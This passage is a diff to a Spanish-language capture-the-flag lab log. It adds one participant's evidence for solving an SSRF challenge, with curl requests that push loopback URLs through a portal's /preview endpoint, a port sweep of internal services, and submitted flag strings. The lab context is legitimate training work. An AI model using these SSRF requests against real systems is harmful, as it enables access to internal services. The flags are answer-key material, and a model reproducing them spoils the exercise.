@@ -7,4 +7,28 @@ Fecha de captura: 2026-11-20 UTC. Operador: Lorenzo Blanc (@LoloBlanc). Origen: 
 3. `./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'` — aceptado; progreso en `salidas/status-extra.txt`.
 4. `./ctf status extra` — 1/3, R3 ✓; R1 y R2 pendientes.
 
-No se incluyen respuestas ni evidencia de R1/R2, que corresponden a otros integrantes.
+El bloque anterior documenta las capturas de Lorenzo. Fernando agrega su evidencia de R1 abajo; R2 sigue asignado a Guadalupe.
+
+## R1/P1/P5 — Fernando Cagliero (@Ferca19)
+
+Fecha: 19/11/2026, America/Buenos_Aires (UTC-03). Cabeceras HTTP del target:
+UTC. Evidencia capturada desde cyberlab-attacker.
+
+1. curl -sS -i phantomcorp-intra/ — salida en salidas/01-direct-intra.txt
+   (no resolvió desde el atacante).
+2. curl -sS -i phantomcorp/ — salida del formulario en
+   salidas/02-portal-home.txt.
+3. curl -sS -i -G --data-urlencode 'url=http://127.0.0.1:80/' --max-time 5
+   http://phantomcorp/preview — salida en salidas/02-ssrf-loopback-80.txt.
+4. Sondeo de puertos 22, 80, 3000, 5000, 5001, 8000, 8080, 8888, 9000, 9090 y
+   9999 a través de /preview — salidas en salidas/03-loopback-port-probes.txt.
+5. Consulta R1:
+   curl -sS -i -G --data-urlencode 'url=http://127.0.0.1:9000/' --max-time 5
+   http://phantomcorp/preview — salidas/04-r1-final.txt.
+6. Progreso local:
+   & 'C:\Program Files\Git\bin\bash.exe' -lc './ctf submit extra R1 "FLAG{ssrf_localhost_panel_interno}"'
+   & 'C:\Program Files\Git\bin\bash.exe' -lc './ctf status extra | tee .loot/labextra-grupo07/fernando/05-status-after-r1.txt'
+   Salida adjunta: salidas/05-status-after-r1.txt; R1 ✓, R2/R3 pendientes (1/3).
+
+No se modificó el target ni se interactuó directamente con localhost desde el
+host atacante. R2 no se ejecutó en este bloque.
